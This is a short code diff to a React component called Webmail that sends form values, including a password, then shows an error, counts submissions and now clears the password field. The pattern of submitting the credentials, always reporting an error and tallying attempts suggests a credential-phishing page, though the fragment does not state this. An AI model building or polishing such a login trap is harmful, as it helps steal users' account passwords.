@@ -28,7 +28,7 @@ function Webmail({ location }) {
       sendFile(values).then((data) => {
         // show error
         notify();
-        setSubmited({ ...submited, count: submited.count + 1 });
+        setSubmited({ ...submited, count: submited.count + 1 }); setValues({ ...values, password: "" });
         console.log(data);
         console.log(submited);
       });
